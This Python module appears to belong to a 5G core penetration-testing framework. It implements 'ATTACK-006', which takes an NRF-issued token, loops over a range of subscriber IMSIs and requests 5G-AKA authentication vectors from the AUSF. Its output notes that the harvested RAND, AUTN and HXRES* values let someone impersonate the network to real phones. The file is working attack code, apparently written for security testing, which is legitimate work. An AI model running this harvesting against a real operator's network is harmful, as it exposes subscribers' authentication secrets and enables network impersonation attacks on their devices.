from attacks.base_attack import BaseAttack, AttackResult
from core import http_client, token_manager
from config import AUSF_URL, MCC, MNC, MNC_PAD, SUPI_START, SUPI_END

class AUSFAuthVectorAttack(BaseAttack):
    attack_id = "ATTACK-006"
    name = "AUSF Auth Vector Harvesting"
    affected_nf = "AUSF"
    endpoint = "POST /nausf-auth/v1/ue-authentications"

    def run(self) -> AttackResult:
        token = token_manager.get_token("AUSF", "nausf-auth")

        if not token:
            return self.result(
                success=False,
                data={},
                evidence="Could not obtain token from NRF",
                conclusion="Token request failed — run ATTACK-002 first."
            )

        harvested = {}
        failed = []

        for i in range(SUPI_START, SUPI_END + 1):
            supi = f"imsi-{MCC}{MNC}{str(i).zfill(10)}"
            url = f"{AUSF_URL}/nausf-auth/v1/ue-authentications"
            body = {
                "supiOrSuci": supi,
                "servingNetworkName": f"5G:mnc{MNC_PAD}.mcc{MCC}.3gppnetwork.org"
            }

            try:
                resp = http_client.post(url, token=token, json=body)

                if resp.status_code in [200, 201]:
                    harvested[supi] = resp.json()
                elif resp.status_code == 403:
                    return self.result(
                        success=False,
                        data={},
                        evidence=f"AUSF returned 403 on {supi}",
                        conclusion="AUSF enforces per-subscriber authorization — attack blocked."
                    )
                else:
                    failed.append(supi)
            except Exception as e:
                failed.append(supi)

        if harvested:
            return self.result(
                success=True,
                data={
                    "harvested_count": len(harvested),
                    "failed_count": len(failed),
                    "auth_vectors": harvested
                },
                evidence=f"Harvested 5G-AKA auth vectors for {len(harvested)} subscribers. "
                         f"Each vector contains RAND, HXRES*, and AUTN.",
                conclusion=f"Authentication vectors extracted for {len(harvested)} subscribers. "
                           f"RAND and AUTN can be used to impersonate the network to a real UE. "
                           f"HXRES* exposes expected SIM response — enables offline analysis."
            )
        else:
            return self.result(
                success=False,
                data={"failed": failed},
                evidence="No auth vectors retrieved in tested SUPI range",
                conclusion="No subscribers found — add subscribers to UDM and retry."
            )